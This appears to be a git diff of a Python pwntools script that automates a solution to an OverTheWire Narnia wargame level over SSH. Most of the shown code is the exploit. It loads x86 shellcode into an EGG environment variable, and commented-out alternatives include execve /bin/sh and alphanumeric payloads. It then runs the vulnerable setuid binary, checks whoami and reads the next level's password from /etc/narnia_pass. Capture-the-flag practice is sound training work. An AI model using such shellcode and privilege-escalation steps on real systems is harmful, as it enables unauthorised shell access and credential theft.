@@ -33,7 +33,7 @@ def send_command(command: list[str], connect: pwn.ssh = connect) -> pwn.tubes.ss
     command = map(str, command)
     command = " ".join(command)
     
-    print(f"Sending process : `{command.__repr__()}`", end="...")
+    print(f"Sending process : `{command}`", end="...")
     channel = connect.system(command.encode())
     print("Done")
     
@@ -176,22 +176,26 @@ if connect.connected():
     
     code_dir = extract_c_code(connect)
 
-    # shit aint working
-    exploit = "\xeb\x11\x5e\x31\xc9\xb1\x21\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x6b\x0c\x59\x9a\x53\x67\x69\x2e\x71\x8a\xe2\x53\x6b\x69\x69\x30\x63\x62\x74\x69\x30\x63\x6a\x6f\x8a\xe4\x53\x52\x54\x8a\xe2\xce\x81"
+    # query = 'export EGG=`perl -e \'print "\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73" . "\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89" . "\\xe3\\x89\\xc1\\x89\\xc2\\xb0\\x0b" . "\\xcd\\x80\\x31\\xc0\\x40\\xcd\\x80"\'`'
+    # query = "export EGG=`python3 -c 'print(\"\\x31\\xc9\\xf7\\xe1\\x51\\xbf\\xd0\\xd0\\x8c\\x97\\xbe\\xd0\\x9d\\x96\\x91\\xf7\\xd7\\xf7\\xd6\\x57\\x56\\x89\\xe3\\xb0\\x0b\\xcd\\x80\")'`"
+    # query = "export EGG=hzzzzYAAAAAA0HM0hN0HNhu12ZX5ZBZZPhu834X5ZZZZPTYhjaaaX5aaaaP5aaaa5jaaaPPQTUVWaMz"
 
-    query = f"EGG=`echo -e '{exploit}'`"
+    query = r"export EGG=`echo -e '\xeb\x11\x5e\x31\xc9\xb1\x21\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x6b\x0c\x59\x9a\x53\x67\x69\x2e\x71\x8a\xe2\x53\x6b\x69\x69\x30\x63\x62\x74\x69\x30\x63\x6a\x6f\x8a\xe4\x53\x52\x54\x8a\xe2\xce\x81'`"
     
-    channel = send_command(command=["cd", dir, "&&", "export", ])
-    output = receive_output(channel=channel)
+    channel = send_command(command=["cd", dir, "&&", query, "&&", f"./narnia{n}"])
+    output = receive_output(channel=channel, lines=1    )
 
-    send_lines_channel([f"./narnia{n}"], channel)
-    output = receive_output(channel=channel)
+    # channel = send_command(["cd", dir, "&&", f"./narnia{n}"])
+    # output = receive_output(channel=channel)
 
     send_lines_channel(["whoami"], channel)
-    output = receive_output(channel=channel)
+    output = receive_output(channel=channel, lines=1)
 
-    send_lines_channel(["cat", "/etc/narnia_pass"], channel)
-    result = receive_output(channel=channel)
+    send_lines_channel([f"cat /etc/narnia_pass/narnia{n+1}"], channel)
+    output = receive_output(channel=channel, lines=1)
+
+    output = output.split()
+    result = output[-1]
     
     dir = save_password(result)
     
